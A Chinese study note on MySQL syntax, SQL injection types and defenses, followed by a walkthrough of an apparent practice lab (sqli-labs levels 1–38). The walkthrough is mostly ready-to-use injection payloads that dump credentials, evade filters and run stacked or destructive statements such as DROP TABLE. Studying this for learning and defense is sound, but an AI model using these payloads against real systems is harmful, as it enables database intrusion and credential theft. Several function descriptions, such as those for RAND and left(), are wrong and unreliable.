
## 一.基础语法
1. 创建一个名为study的数据库的语句是?
```php
CREATE DATABASE study;
```
2. 在study库里创建一个user表
包含三列:id(整数) name(长度为100的字符串) sex(长度为1的字符串)
```php
//先切换到study数据库
USE study;
CREATE TABLE user(
	id INT,//整数
	name VARCHAR(100),//可变字符串
	sex CHAR(1)
); 

```
3. 往user表中插入以下数据
id=0 ,name=123 sex=x
id=1 name=421 sex=y
```php
INSERT INTO user(id,name,sex) VALUES (0,'123','x');
INSERT INTO user(id,name,sex) VALUES (1,'421','y');
INSERT INTO user(id,name,sex)
VALUES 
	(0,'123','x'),
	(1,'421','y');

```
4. 查询user表中所有数据的name列语句是?
```php
SELECT name FROM user;
```
5. 查询user表中name为123的字段的语句是?
```php
SELECT * FROM user WHERE name = "123";
```
6. 删除user表中sex为x的语句是?
```php
DELETE FROM user WHERE sex ="x";
```
7. 修改user表中id为8的数据,将其name值改为456的语句是?
```php
UPDATE user SET name='456' WHERE id=8;
```
8. 了解mysql的函数,在mysql中user函数的作用是?

`USER()` 函数用于返回当前 MySQL 连接的用户名和主机名，返回结果的格式为 `'用户名@主机名'`。
通过 `USER()` 函数可以获取当前连接到 MySQL 服务器的用户账号信息，包括登录的用户名和客户端主机（或 IP 地址）。
```sql
SELECT USER();
```
可能返回
```sql
root@localhost
```
在 MySQL 权限系统中，权限是基于「用户名 @主机名」的组合进行分配的。`USER()` 函数可以帮助确认当前连接的身份是否匹配预期的权限配置。
在编写存储过程、触发器或日志相关的 SQL 脚本时，可通过 `USER()` 函数记录操作执行的用户身份，便于追溯.
```sql
CONCART(str1,str2,...);--拼接多个字符串
```
```sql
LENGTH(str);--返回字符串函数
```
```sql
SUBSTRING(str,start,length);--从第start个开始，截取length个字符
```
```sql
UPPER(str);/ LOWER(str);--转化为大小写
```
```sql
TRIM(str);--去除字符串首尾空格
```
```sql
ABS(n);--取绝对值
```
```sql
ROUND(n,d);--四舍五入d为小数位数
```
```sql
CEIL(n);/FLOOR(n);--向上/向下取整
```
```sql
RAND();--生成0-1之间的整数
```
```sql
MOD(a,b);--取余数，a/b的余数
```
```sql
NOW();--返回当前日期或时间
```
```sql
 DATE_FORMAT(NOW(), '%Y年%m月%d日');--格式化日期
```
```sql
SELECT COUNT(*) FROM user;--统计user表的总记录数
```
```sql
SELECT SUM(SCORE) FROM student;--计算总和
```
```sql
SELECT AVG(age) FROM user;--计算user表中年龄的平均数
```
```sql
SELECT MAX(price) FROM products;--计算最大值

SELECT VERSION();--返回MySQL服务器版本

SELECT DATABASE();--返回当前数据库名

SELECT USER();--返回 用户名@主机名

IF(expr,v1,v2);--如果expr为真返回v1,否则返回v2

IFNULL(v1,v2);--如果v1不为NULL,返回v1,否则v2



CASE--多条件判断
concat_ws('~',A,B)--输出A~B
group_concat()--输出整组数据
left(a,b);--从左侧截取a的前b位，正确返回1，错误返回0，没有返回NULL
select user() regexp'r';--user为root其中有r所以返回1
select user() like'r%';--匹配与regexp类似
substr(a,b,c);--从位置b开始截取a字符串c为长度
ascii();--将字符串转换成ascii值
select ascii(substr((select database())),1,1);--嵌套使用
```
查库：`select schema_name from information_schema.schemata`
查表:`select table_name from information_schema.tables where table_schema='security'`security一般要转换成16进制，防止单引号闭合问题
查列：`select column_name from information_schema.columns where tables_name='users'`
查字段：`select username,password from security.users`
9. sql中用于注释的单行与多行语句格式分别是?
使用 `--`（两个连字符）开头，注释内容从 `--` 开始到该行结束。
使用 `/*` 作为开头，`*/` 作为结尾，中间的内容（可跨多行）均为注释。
10. 了解mysql中的内联注释，它在安全方面的作用是
在 MySQL 中，**内联注释**（Inline Comment）是一种特殊的注释语法，格式为 ```
```sql
/*! ... */
```
特点：
 内容会被 MySQL 服务器解析执行（普通注释会被忽略），但其他数据库（如 SQL Server、Oracle）会将其视为普通注释。
#### 内联注释在安全方面的主要作用：
（1）.**绕过关键字过滤**
很多 Web 应用会对用户输入进行过滤，拦截 `SELECT`、`UNION`、`OR` 等 SQL 关键字。内联注释可将关键字 “隐藏” 在注释格式中，绕过检测。
（2）.**执行版本特定的注入代码**
内联注释支持添加 MySQL 版本号，格式为 `/*!版本号 代码*/`，只有当 MySQL 版本 >= 该版本时，才会执行内部代码。如：
```sql
/*!50003 DROP TABLE users */
```
（3).**绕过空格过滤**
部分过滤规则会拦截 SQL 语句中的空格，内联注释可替代空格分隔关键字 如：
```sql
SELECT/*！id*/FROM/*!user*/;
```

## 二.SQL注入
1. **原理**：攻击者通过构造特殊的输入数据，将恶意 SQL 代码注入到应用程序的数据库查询中，从而欺骗数据库执行非预期的操作
2. **发生原因**：
（1）.应用程序未对用户输入的特殊字符（如单引号 `'`、双引号 `"`、分号 `;`、注释符 `--` 等）进行过滤或转义，导致攻击者可以闭合 SQL 语句的原有逻辑，插入新的恶意代码。
（2).开发时图方便，将用户输入直接拼接到 SQL 语句中（如上述例子），而不是使用**参数化查询（Prepared Statement）** 或预编译语句。
（3).误认为用户输入只会是 “合法值”（如正常的用户名、ID 等），忽略了攻击者可能构造的异常输入（如包含 SQL 关键字的字符串）。
(4).数据库连接用户拥有过高权限（如 `root` 权限），即使发生注入，攻击者也能执行 `DROP TABLE`、`DELETE` 等高危操作，扩大攻击影响。
(5).应用程序将详细的数据库错误信息（如表名、字段名、SQL 语句结构）直接返回给用户，攻击者可利用这些信息优化注入语句，提高攻击成功率。
3. **类型**
（1).联合注入:
原理：利用 SQL 的 `UNION ALL` 或 `UNION` 关键字，将攻击者构造的查询语句与应用程序原查询语句的结果 “联合” 返回，从而获取数据库中的敏感数据。
步骤：
 **判断列数**：通过 `ORDER BY N` 猜解原查询的列数（N 为数字，当 N 超过实际列数时会报错）。  
    示例：`http://example.com/search?id=1 ORDER BY 3--+`（若不报错，说明至少 3 列；若报错，减少 N 继续测试）。
**判断回显位**：用 `UNION SELECT` 构造查询，观察哪些列会在页面显示（回显位）。  
    示例：`http://example.com/search?id=-1 UNION SELECT 1,2,3--+`（若页面显示 “2” 或 “3”，则对应位置为回显位）。
**获取敏感数据**：在回显位替换为查询数据库信息的 SQL 语句。
    - 查数据库名：`UNION SELECT 1,database(),3--+`
    - 查当前库表名：`UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+`
    - 查用户表字段：`UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--+`
    - 查账号密码：`UNION SELECT 1,group_concat(username,':',password),3 FROM users--+`

（2）.报错注入
原理：当应用程序开启了数据库错误提示（如 PHP 的 `display_errors=On`），攻击者可构造特殊 SQL 语句，使数据库执行时产生错误，并将敏感数据包含在错误信息中返回给页面。
步骤：- **extractvalue()**：用于从 XML 字符串中提取指定路径的内容，若路径非法则报错，可嵌入查询语句。  
    示例：`http://example.com/login?username=admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+`  
    错误信息会显示：`XPATH syntax error: '~test_db~'`（`test_db` 为当前数据库名），因为test_db不符合XPATH语法
- **updatexml()**：与 `extractvalue()` 类似，用于更新 XML 字符串，非法路径会报错。  
    示例：`username=admin' AND updatexml(1,concat(0x7e,(SELECT group_concat(username) FROM users),0x7e),1)--+`
- **floor() + rand() + group by**：利用 `floor(rand(0)*2)` 的随机性，结合 `group by` 分组时的冲突报错，适用于低版本 MySQL（5.0~5.6）。
（3）.布尔盲注
原理：应用程序仅返回 “真” 或 “假” 两种结果（如正确输入显示页面内容，错误输入显示 “无数据” 或空白页），攻击者通过构造 **布尔判断语句**（如 `AND 1=1`、`AND 1=2`），根据页面返回差异逐步 “猜解” 敏感数据。
步骤：1. **判断数据库名长度**：通过 `LENGTH(database())=N` 猜解长度，若页面正常则 N 为正确长度。  
    示例：`http://example.com/search?id=1 AND LENGTH(database())=5--+`（若页面正常，说明数据库名长度为 5）。
2. **逐字符猜解数据库名**：利用 `SUBSTR()` 函数截取字符，结合 `ASCII()` 函数将字符转为 ASCII 码，逐个判断。  
    示例：`id=1 AND ASCII(SUBSTR(database(),1,1))=116--+`（`116` 对应 ASCII 字符 `t`，若页面正常，说明数据库名第一个字符为 `t`）。
3. **扩展猜解**：重复步骤 2，依次猜解表名、字段名、数据内容（如账号密码的每一位）。
（4）.时间盲注
原理：应用程序无任何结果回显（布尔状态也无差异），攻击者通过构造 **时间延迟语句**（如 `IF(条件, SLEEP(N), 0)`），根据数据库执行查询的 “耗时” 判断条件是否成立，进而猜解数据。
步骤：
- **IF(condition, sleep(5), 0)**：若 `condition` 为真，数据库延迟 5 秒返回；若为假，立即返回。  
    示例：`http://example.com/login?username=admin' AND IF(LENGTH(database())=5, SLEEP(5), 0)--+`  
    若页面加载时间超过 5 秒，说明数据库名长度为 5。
- **BENCHMARK(count, operation)**：通过重复执行 `operation`（如 `MD5('test')`）`count` 次，制造时间延迟（适用于无 `SLEEP()` 函数的场景）。
（5）.二次注入
步骤：
1. **第一步（注入存储）**：将恶意 SQL 代码（如 `admin' --+`）通过表单（如注册、留言）提交，应用程序未过滤直接存储到数据库（如用户表的 `username` 字段）；
2. **第二步（触发注入）**：当应用程序从数据库读取该数据并拼接到 SQL 查询时（如后台用户管理查询 `SELECT * FROM users WHERE username='admin' --+'`），恶意代码被执行，篡改查询逻辑。
- 注册账号时，用户名输入 `admin' --+`，数据库存储该用户名；
- 后台管理员查询该用户时，执行 `SELECT * FROM users WHERE username='admin' --+'`，`--+` 注释掉后续语句，实际查询 `admin` 用户的数据，攻击者可伪装成管理员。
（6）.堆叠注入
利用 `;`分隔多个 SQL 语句，一次性执行（如 `id=1; DROP TABLE users;`），但需数据库和应用程序支持多语句执行（多数场景不支持，危害极高）；
（7）.宽字节注入
针对使用 GBK/GB2312 编码的应用，攻击者通过 `%df'` 等宽字节字符，绕过应用程序的单引号转义（如 `\'` 被转义为 `%df\'`，GBK 编码中 `%df%5c` 是合法汉字，导致单引号 `'` 逃逸）；
（8）.Cookie注入
若应用程序使用 Cookie 值拼接 SQL（如 `SELECT * FROM users WHERE id=${_COOKIE['user_id']}`），攻击者可修改 Cookie 值注入恶意代码。
## 三. 防御
1.  **核心防御：使用参数化查询**
参数化查询是防御 SQL 注入的**最有效、最推荐**的方式，其原理是：先定义 SQL 语句的 “模板”（占位符 `?` 或命名参数），再将用户输入作为 “参数” 传递给数据库，数据库会自动处理参数的转义，避免恶意代码被解析为 SQL 指令。
```python
sql = "SELECT * FROM users WHERE username = %s AND password = %s" # 占位符%s
cursor.execute(sql, (username, password)) # 输入作为元组传递
```

2. **输入验证与过滤**
- **类型校验**：若参数为数字（如 `id`），强制转换为整数类型（如 `intval($_GET['id'])`）；
- **长度限制**：限制输入长度（如用户名最长 20 字符、密码最长 32 字符）；
- **特殊字符过滤**：对 SQL 关键字（如 `UNION`、`SELECT`、`OR`）、特殊符号（如 `'`、`;`、`#`）进行转义或过滤（需结合数据库编码，避免宽字节注入）。  
    示例（PHP）：`$username = mysqli_real_escape_string($conn, $_POST['username']);`（但需配合参数化查询，不可单独依赖）。
3. **最小权限原则**
- 应用程序的数据库账号仅授予 **SELECT/INSERT/UPDATE/DELETE** 等必要权限，禁止 `DROP`、`ALTER`、`FILE`（读写文件）等高危权限；
- 不同功能模块使用不同数据库账号（如查询用户用 `user_read` 账号，修改订单用 `order_write` 账号），降低漏洞影响范围。
4. **禁用错误回显**

在生产环境中，禁止应用程序向页面返回数据库错误信息，避免攻击者通过错误提示获取数据库结构。
- **PHP**：设置 `php.ini` 中 `display_errors = Off`，并将错误日志写入文件（`log_errors = On`）；
5. **使用ORM框架**
ORM（对象关系映射）框架（如 Hibernate、MyBatis、Django ORM）内部已实现参数化查询，可减少手动拼接 SQL 的风险。
6. **其他**
- **使用 WAF（Web 应用防火墙）**：部署 WAF（如阿里云 WAF、ModSecurity），通过规则拦截 SQL 注入、XSS 等常见攻击（WAF 为 “最后一道防线”，不可替代代码层防御）；
- **定期安全测试**：使用工具（如 SQLMap、Burp Suite）扫描应用程序，或进行渗透测试，及时发现并修复注入漏洞；
- **加密敏感数据**：对数据库中的敏感数据（如密码、手机号）进行加密存储（如密码用 BCrypt、Argon2 哈希，手机号用 AES 加密），即使数据被窃取，攻击者也无法直接使用。
## 等价替换
- or -> ||
- and -> &&
- =  -> like
- , ->join
- 空格->`/**/`或`()`
## 三.WriteUp
#### 第一关
1. 先输入`?id=1'--+`存在回显说明字符拼接成功，再输入`?id=1' order by 3 --+`如果报错则超过列数，显示正常就是没有超出列数，可以确定有三列
2. 输入`id=-1' union select 1,2,3--+`爆显示位，看哪几列在页面中显示，看到第二和第三列显示
3. 输入`?id=-1' union select 1,database(),version()--+`确定security版本号为5.7.26
4. 输入`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+`其中将'security'转换成十六进制防止单引号闭合问题，用来查表
5. 输入`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+`用来查字段名，用户名和密码可能在users表中，可查询到username 和 password两个敏感词
6. 输入`?id=-1' union select 1,2,group_concat(concat_ws('~',username,password)) from users--+`可查询到所有用户名和对应密码
7. 补充：`?id=1'union select 1,2,3--+` 为什么可能无效？- 此时，第一个查询 `SELECT * FROM users WHERE id='1'` 会正常执行：如果数据库中存在 `id=1` 的记录，页面会显示该记录的结果（第一个结果集），而 `union select 1,2,3` 的结果（第二个结果集）会被忽略，因此看不到 `1,2,3` 的输出。

#### 第二关
1. 输入`?id=1'`报错信息看不到数字，判断为数字型注入，步骤同上
#### 第三关
1. 输入`id=1`看到('1'),说明是单引号字符型且有括号，步骤同第一关
#### 第四关
1. 输入`id=1`看到(“1”),说明是双引号字符型且有括号，步骤同第一关
#### 第五关
1. 输入?id=1,返回you are in.... 没有返回数据，所以应用布尔盲注
2. 输入`?id=1'and length((select database()))>9--+`判断数据库名的字数   
3. 输入`?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema='security')>13--+`判断所有表名字符长度
4. 输入`?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='security',1,1))>99--+`逐一判断表名，找到重要信息`users`
5. 输入`
`?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))>20--+`判断字段名的长度
6. 输入`?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),1,1))>99--+`逐一判断字段名
7. 输入`?id=1' and length((select group_concat(username,password) from users))>109--+`判断字段内容长度
8. 输入·`?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+`逐一检测内容
#### 第六关
1. 将 ' 改为 “ 其余同第五关
#### 第七关
1. 输入`?id=1'`报错，而输入`?id=1"`显示正常，可以断定id是单引号字符串，单引号破坏了原来的语法结构，之后多次尝试输入`?id=1'))--+`发现页面显示正常，之后步骤同第五关
#### 第八关
1. 没有报错信息，其余同第五关，id参数是一个单引号字符串
#### 第九关
1. 不论输入什么页面显示都是you are in....,所以不适合用布尔盲注，布尔盲注只适合对于正确错误有不同反应的页面,因该用时间盲注
2. 输入`?id=1' and if(1=1,sleep(5),1)--+`判断id是单引号字符串
3. 输入`?id=1' and if(length((select database()))=8,sleep(2),1)--+`判断数据库名的长度为8
4. 输入`?id=1' and if(ascii(substr((select database()),1,1))>100,sleep(2),1)--+`确定数据库名为security
5. 输入`?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema='security')=29,sleep(1),1)--+`判断表名长度为29
6. 输入`?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='security',1,1))>99,sleep(5),1)--+`逐一判断表名，找到敏感词users
7. 输入`?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))>20,sleep(5),1)--+`判断字段名长度
8. 输入`
`?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+`判断字段名，找到，username，password
9. 输入`?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+`判断字段内容长度为175
10. 输入`?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+`逐一判断字段内容，得到用户和密码
#### 第十关
1. 将单引号换成双引号，其余同第九关，前十关为get请求
#### 第十一关
1. 从这一关开始为post请求，当输入1‘时，根据报错信息可知该sql语句username='参数' and password='参数'
2. 输入一个恒成立的语句`1' or 1=1#`用#注释，输入`1' union select 1,2#`可知1，2回显
3. 输入`1' union select 1,database()#`找到关键词security
4. 输入`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#`用来查表，找到关键字users
5. 输入`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#`找到username,password关键词
6. 输入`?1' union select 1,group_concat(concat_ws('~',username,password)) from users#`得到用户名和密码
#### 第十二关
1. 输入`1"`得到报错信息可知sql语句是双引号且有括号。将`'`
改为`")`其余同第十一关
#### 第十三关
1. 输入`1'`得到报错信息可知sql语句是单引号且有括号。将`'`
改为`')`其余同第十一关
#### 第十四关
1. 将单引号换成双引号，其余同第十一关
#### 第十五关
1. 不会产生报错信息，用布尔盲注，其余同十一关
#### 第十六关
1. 不会产生报错信息，用布尔盲注，其余同十二关
#### 第十七关
1. 因为更改密码为更新数据库，应该用报错注入，用updataxml报错注入
2. 输入一个已经存在的用户名admin,再在密码处输入`123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#`输出版本号为5.7.26
3. 输入`123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#`爆库名security
4. 输入`123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#`爆表名找到users
5. 输入`123' and(updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x5c),1))#`得到username,password关键字
6. 输入`123' and(updatexml(1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#`返回`You can't specify target table 'users' for update in FROM clause` 使`select`的结果再通过一个中间表`select`多一次，便可以绕过上面的问题 `123' and(updatexml(1,concat(0x5c,(select group_concat(concat_ws('~',username,password)) from (select* from users) as humgahigao1463),0x5c),1))#`其中humgahigao1463为临时表名，攻击者往往会用随机字符命名临时表，以避免与数据库中已有的合法表名冲突，同时也带有一定的隐蔽性。输入后得到用户名和密码
#### 第十八关
1. 注入类型为报错注入，本关对输入的 `User-Agent` 内容做了简单过滤，空格会被拦截，单引号会被转义
2. 输入用户密码admin/admin用yakit放行请求，再刷新页面又拦截到一条post请求，再user-agent后加上
`'/**/and/**/updatexml(1,concat(0x7e,database(),0x7e),1)/**/and/**/'1'='1`
用`/**/`代替空格,避免被过滤,得到数据库名security
3. 将user-agent**取代为**`1'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1),1,1)-- qwe`其中
`-- qwe`作用是**忽略注入语句后面的所有内容**，避免因后台剩余 SQL 代码导致的语法错误,  语句括号不对称，多了一个`,1,1)`是为了补全后面注释掉的语句和括号，最后得到敏感词users
4. 将user-agent改为`1'and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1),1,1)-- qwe`得到username,password关键字
5. 将user-agent改为`1'and updatexml(1,concat(0x7e,(select group_concat(concat_ws('!',username,password)) from users limit 0,1),0x7e),1),1,1)-- qwe`得到用户和密码
#### 第十九关
1. 将referer改为`'and updatexml(1,concat(0x7e,database(),0x7e),1) and '`得到security
2. 将referer改为`'or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) or '`得到users
3. 将referer改为`'or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) or '`得到username,password
4. 将referer改为`'or updatexml(1,concat(0x7e,(select group_concat(concat_ws('!',username,password)) from users),0x7e),1) or '`得到用户和密码
#### 第二十关
1. 首先输入正确的账户和密码测试，用yakit抓包，抓到之后放行POST再抓GET，此时GET中会有cookie信息此时就可以在cookie处进行测试注入
2. 在cookie后加`'and updatexml(1,concat(0x7e,database(),0x7e),1) and '`得到security
3. 在cookie后加上`'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) and '`得到users
4. 在cookie后加上`'and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) and '`得到username,password
5. 在cookie后加上`'and updatexml(1,concat(0x7e,(select group_concat(concat_ws('!',username,password)) from users),0x7e),1) and '`放行后得到用户和密码
## 第二十一关
网页对输入内容进行编码，所以输入时输入base64编码后的内容，其余同上一关
## 第二十二关
这一关闭合方式不同，用双引号闭合，其余同上一关
## 第二十三关
这一关将#和--+都注释掉了，但可以用`?id=-1' union select 1,database(),3 and '1'='1`原语句是`SELECT * FROM users WHERE id='$id' LIMIT 0,1`将`$id`替换掉为`SELECT * FROM users WHERE id='-1' union select 1,database(),3 and '1'='1' LIMIT 0,1`,得到数据库，其余同第一关，只是将注释符换为`and '1'='1`
## 第二十四关
利用二次注入
注：POST的方式传参，因此不能使用--+来进行注释，而是要用#
根据源码可知
```php
$username= $_SESSION["username"];

    $curr_pass= mysql_real_escape_string($_POST['current_password']);

    $pass= mysql_real_escape_string($_POST['password']);

    $re_pass= mysql_real_escape_string($_POST['re_password']);
    UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
```
username没有被转义，可以动手脚，可以注册一个用户名为`admin'#`放进去原语句变为`UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'`，因为数据库中一定有一个admin账户，所以可以先注册一个`admin'#`的账户，密码是123456（随便），然后用这个账户密码登录一下，修改密码，因为`admin'#`插入原语句后语句逻辑发生变化，所以你修改的是admin的账户密码，从而在不知道admin密码的情况下登入账户。
## 第二十五关
根据
```php
function blacklist($id)

{
    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)
    $id= preg_replace('/AND/i',"", $id);        //Strip out AND (non case sensitive)
    return $id;
}
```
可知or , AND都被禁了，并且大小写都不行,但可以用&&逻辑运算符替换，他与and等价，||与or等价,但是&&在url栏里有特殊含义，他表示多个传参，所以要对他进行url编码，但inforamtion里存在or,可以将or 替换为`oorr`因为删除函数只执行一次，其余同第一关
## 第二十五a关
```php
SELECT * FROM users WHERE id=$id LIMIT 0,1
```
所以`id=-1 union select 1,2,3--+`就行了，单引号省了,其余同第一关
## 第二十六关
根据源码
```php
function blacklist($id)
{
    $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)
    $id= preg_replace('/and/i',"", $id);        //Strip out AND (non case sensitive)
    $id= preg_replace('/[\/\*]/',"", $id);      //strip out /*
    $id= preg_replace('/[--]/',"", $id);        //Strip out --
    $id= preg_replace('/[#]/',"", $id);         //Strip out #
    $id= preg_replace('/[\s]/',"", $id);        //Strip out spaces
    $id= preg_replace('/[\/\\\\]/',"", $id);        //Strip out slashes
    return $id;
}
```
这段代码将`or,and,/,\,#,-,*,所有空白字符`都移除了，前几个都有解决办法，可以用<  , <>, %20,%09，`$IFS$9`,`${IFS}`,`$IFS`,`$IFS$1`,`%0a` `%a0`替代空格`?id=a'%a0union%a0select%a01,database(),3||%a0'1'='1`其余同第一关，and可以用`||`  `,`可以用`join`替代
## 第二十六a关
将所有单引号换为`('`或`')`,其余与上一关类似因为
```php
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```
## 二十七关
```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);      //strip out /*
$id= preg_replace('/[--]/',"", $id);        //Strip out --.
$id= preg_replace('/[#]/',"", $id);         //Strip out #.
$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
$id= preg_replace('/select/m',"", $id);     //Strip out saces.
$id= preg_replace('/[ +]/',"", $id);        //Strip out spaces.
$id= preg_replace('/union/s',"", $id);      //Strip out union
$id= preg_replace('/select/s',"", $id);     //Strip out select
$id= preg_replace('/UNION/s',"", $id);      //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);     //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);      //Strip out Union
$id= preg_replace('/Select/s',"", $id);     //Strip out select
return $id;
}
```
在上一关基础上又过滤了union  select,但区分大小写，可以用uNion,和sElect绕过
## 二十七a关
根据`$id = '"' .$id. '"';`和`SELECT * FROM users WHERE id=$id LIMIT 0,1`只需将闭合方式修改为`"`
## 二十八关
`$id= preg_replace('/union\s+select/i',"", $id);`,这一关的select不区分大小写，用`?id=a')%a0uNion%a0select%a01,database(),3||%a0('1')=('1`因为后面中间有%a0,所以不是空字符，可以绕过
## 二十八a关
这一关与上一关貌似没什么区别，限制更松了
## 二十九关
http参数污染由提交相同参数的不同处理方式导致`?id=1&id=0' union select 1,database(),3 --+`，id传了两个参数，第一个交给Jsp处理，第二个交给Php处理，只会执行第二个参数，从而绕过。剩下用报错注入可以了
## 第三十关
这一关闭合方式为`"`,用盲注
## 第三十一关
这一关闭合方式为`")`，其余同上一关
## 第三十二关
宽字节注入
```php
function check_addslashes($string)

{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                              //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
    return $string;
}
```
将`/`替换为`//`,`'`替换为`\'`  `"`替换为`\"`
addslashes函数的作用就是让'变成`\'`，让引号变得不再是原本的“单引号”，没有了之前的语义，而是变成了一个字符。那么我们现在要做的就是想办法将'前面的\给它去除掉输入`?id=1%df%27` 处理成了`1�\'`这是因为编码为gbk然后我们输入的%df+%27导致%df%27变成了運）,宽字节注入是由数据库和页面编码不同导致的，%27是单引号，但输入后会在前面，加一个`\`,%df和\会组合成一个新的汉字，\也就不会转换成`\\`了，从而让单引号单独逃逸出来，就可以执行之后的代码了,如`?id=-1%df%27 union select 1,database(),3--+`
查表名时用`?id=-1%df%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+`将`security`转换为十六进制并在前面加上0x，或者将`'security'`换为`database()`这样不用单引号，不然会报错
## 三十三关
貌似与三十三关一样，一个是手写函数，一个用的是php标准库的函数addslashes()
## 三十四关
这一关是post传参也会在单引号前加反斜杠，但不能直接用宽字节了，因为post参数不识别url编码，如果输入%df他会将他解析为三个单独的字符，但可以用抓包的hex模块，先在用户名处输入`a' union select 1,2#`点提交抓到包，在hex模块将a对应的61，改为df,让后重放，可以成功注入宽字节，也可以用汉字绕过，有的汉字是三个字节，也有的汉字是四个字节，三个字节的汉字与后面一个斜杠组合成一个四个字节的汉字，如`汉' union select 1,2#`
## 三十五关
又回到get请求
这一关看源码`SELECT * FROM users WHERE id=$id LIMIT 0,1`没有闭合，但addslashes()函数还是有的，注意一下`'security'` 要转十六进制，其余所以同第一关，
## 第三十六关
```php
function check_quotes($con1, $string)
{
    $string=mysqli_real_escape_string($con1, $string);    
    return $string;
}
```
`mysqli_real_escape_string()`和`addslashes()`函数类似，用%df%27宽字节绕过就行了，其余同前面的，记得转十六进制
## 三十七关
貌似与34关一样
## 第三十八关
是get,因为存在mysqli_multi_query可以将多个sql语句同时执行 可以用堆叠注入，如`?id=1';insert into users(id,username,password) values ('100','100','100')--+`可以在数据库中插入值，也可以删除值




















